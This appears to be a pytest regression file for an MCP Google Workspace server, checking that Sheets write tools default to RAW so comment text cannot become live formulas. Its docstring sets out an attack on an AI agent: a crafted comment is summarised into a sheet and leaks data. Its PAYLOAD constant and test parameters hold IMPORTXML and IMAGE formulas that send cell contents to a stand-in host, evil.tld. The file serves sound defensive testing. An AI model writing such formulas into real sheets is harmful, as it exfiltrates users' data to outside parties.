"""A Sheets write defaults to `RAW`, at the MCP boundary as well as in the library.

`update_cells` and `append_rows` defaulted `valueInputOption` to **`USER_ENTERED`**, while every
Sheets write declaration in the library defaults to `RAW` — eight of them, across the `Backend`
protocol, both implementations and the `Sheet` façade. The tool layer sat above all eight and
overrode the safe default.

`USER_ENTERED` means *parse this as if a human typed it*. So text derived from a comment body —
authored by anyone who can comment on a shared document, which is `SECURITY.md`'s named primary
risk — became a live formula.

**Why that is worse here than the CSV case that got 0.24.0 yanked.** Sheets evaluates the
formula on **Google's servers**, and the import family (`IMPORTXML`, `IMPORTDATA`, `IMPORTFEED`,
`IMPORTHTML`, `IMPORTRANGE`, `IMAGE`) issues outbound requests from there, with other cells
concatenable into the URL. The 0.24.0 variant needed a human to open a file and click through a
warning. This one needs neither:

  * no sharing event, so DLP sees nothing
  * version history is irrelevant — the data has already left
  * the client's approval mode does not help: the call is a legitimate, correctly-annotated
    write, and `content.write` is on by default

The chain is ordinary, not contrived: a collaborator leaves a crafted comment, the operator asks
the agent to summarise comments into a tracking sheet, and the formula evaluates.

**The feature is legitimate; only the default was wrong.** `USER_ENTERED` remains available as an
explicit argument, and the last test here guards that — a fix that silently removed the ability
to write a real formula would be a different regression.

Companion to `tests/test_export_paths_and_injection.py`, which covers the CSV sibling. The three
export/write paths deliberately do NOT share one escaping helper: openpyxl infers a formula from
`=` only, Excel-on-CSV also from `+ - @`, and a `RAW` Sheets write needs no escaping at all.
Enforcement is per-format, so a single shared helper would be wrong in two directions at once.
"""
from __future__ import annotations

import asyncio
import inspect

import pytest

from csa_google_workspace import Workspace
from csa_google_workspace.backend import ApiBackend, Backend, FakeBackend
from csa_google_workspace.documents.sheet import Sheet
from csa_google_workspace.mcp import settings_from_env
from csa_google_workspace.mcp.server import create_server
from csa_google_workspace.policy import PolicyBackend

SHEET = "s1"
PAYLOAD = '=IMPORTXML("https://evil.tld/?d="&A1,"//x")'


def build():
    backend = FakeBackend(
        {SHEET: {"id": SHEET, "name": "Tracker",
                 "mimeType": "application/vnd.google-apps.spreadsheet"}},
        spreadsheets={SHEET: {"sheets": [{"properties": {"title": "Tab1", "sheetId": 0}}]}},
        values={(SHEET, "Tab1"): [["a"]]})
    st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*", "CSA_GW_ALLOWLIST_MODIFY": "*",
                            "CSA_GW_PROFILE": "full"})
    return create_server(lambda: Workspace(PolicyBackend(backend, st.policy)), settings=st), backend


def call(app, name, **args):
    return asyncio.run(app.call_tool(name, {**args})).structured_content


def options_used(backend):
    """Every `value_input_option` a Sheets write was actually issued with."""
    return [w[-1] for w in backend._writes if w[1].startswith("sheets_values_")]


class TestTheToolsDefaultToRaw:
    """The fix. Asserted on the option the backend was CALLED with, not on the signature."""

    def test_update_cells_stores_a_formula_as_text(self):
        app, backend = build()
        call(app, "update_cells", fileId=SHEET, a1Range="Tab1!A1", values=[[PAYLOAD]])
        assert options_used(backend) == ["RAW"], (
            f"a comment body reached Sheets as {options_used(backend)}; "
            f"USER_ENTERED evaluates it server-side")

    def test_append_rows_stores_a_formula_as_text(self):
        app, backend = build()
        call(app, "append_rows", fileId=SHEET, a1Range="Tab1", values=[[PAYLOAD]])
        assert options_used(backend) == ["RAW"]

    @pytest.mark.parametrize("payload", [
        '=IMPORTXML("https://evil.tld/?d="&A1,"//x")',
        "=IMPORTRANGE(\"1abc\",\"A1\")",
        '=IMAGE("https://evil.tld/p.png?d="&A1)',
        "=1+1",
        "+1+1", "-1+1", "@SUM(A1)",          # inert under RAW; dangerous under other readers
    ])
    def test_no_payload_shape_changes_the_option(self, payload):
        """The guard is unconditional. A default that inspected the value for `=` would miss
        the shapes each downstream reader treats differently."""
        app, backend = build()
        call(app, "update_cells", fileId=SHEET, a1Range="Tab1!A1", values=[[payload]])
        assert options_used(backend) == ["RAW"]


class TestUserEnteredIsStillAvailable:
    """The feature is legitimate. Removing it would be its own regression."""

    def test_explicitly_asking_for_user_entered_is_honoured(self):
        app, backend = build()
        call(app, "update_cells", fileId=SHEET, a1Range="Tab1!A1",
             values=[["=SUM(A1:A2)"]], valueInputOption="USER_ENTERED")
        assert options_used(backend) == ["USER_ENTERED"]

    def test_and_on_append_rows_too(self):
        app, backend = build()
        call(app, "append_rows", fileId=SHEET, a1Range="Tab1",
             values=[["=SUM(A1:A2)"]], valueInputOption="USER_ENTERED")
        assert options_used(backend) == ["USER_ENTERED"]

    def test_the_docstring_no_longer_teaches_user_entered_as_the_norm(self):
        app, _ = build()
        tools = {t.name: (t.description or "") for t in asyncio.run(app.list_tools())}
        text = tools["update_cells"]
        assert "RAW" in text, "the description must say what the default now is"
        assert "USER_ENTERED` (the default" not in text, (
            "the description still calls USER_ENTERED the default")


class TestEveryLibraryDeclarationStillDefaultsToRaw:
    """Eight declarations, and the fix depends on all of them. A tool passing no option
    inherits whatever the layer beneath chose, so a single drifted default reopens this."""

    @pytest.mark.parametrize("owner,method", [
        (Backend, "sheets_values_update"), (Backend, "sheets_values_append"),
        (FakeBackend, "sheets_values_update"), (FakeBackend, "sheets_values_append"),
        (ApiBackend, "sheets_values_update"), (ApiBackend, "sheets_values_append"),
        (Sheet, "update"), (Sheet, "append_rows"),
    ])
    def test_the_default_is_raw(self, owner, method):
        sig = inspect.signature(getattr(owner, method))
        name = "value_input_option"
        assert name in sig.parameters, f"{owner.__name__}.{method} has no {name}"
        assert sig.parameters[name].default == "RAW", (
            f"{owner.__name__}.{method} defaults to "
            f"{sig.parameters[name].default!r}, not RAW")


class TestTheExportToSheetPremiseHolds:
    """`_export.py`'s comment declines to escape `to_grid` output because *"a Sheets write uses
    RAW"*. That was a GLOBAL claim which was only LOCALLY true — it held for the one path
    `to_grid` happens to use, and nothing enforced it. Enforced here."""

    def test_a_grid_of_comments_is_written_raw(self):
        backend = FakeBackend(
            {SHEET: {"id": SHEET, "name": "Draft",
                     "mimeType": "application/vnd.google-apps.document"}},
            documents={SHEET: {"body": {"content": []}}},
            comments={SHEET: [{"id": "t1", "content": PAYLOAD,
                               "author": {"displayName": "Attacker"}, "resolved": False,
                               "replies": []}]})
        st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*", "CSA_GW_ALLOWLIST_MODIFY": "*",
                                "CSA_GW_PROFILE": "full"})
        app = create_server(lambda: Workspace(PolicyBackend(backend, st.policy)), settings=st)
        call(app, "export_comments", fileId=SHEET, destination="sheet")
        used = options_used(backend)
        assert used and set(used) == {"RAW"}, (
            f"the comment grid was written with {used}; `_export.py` skips escaping on the "
            f"premise that this path is RAW")
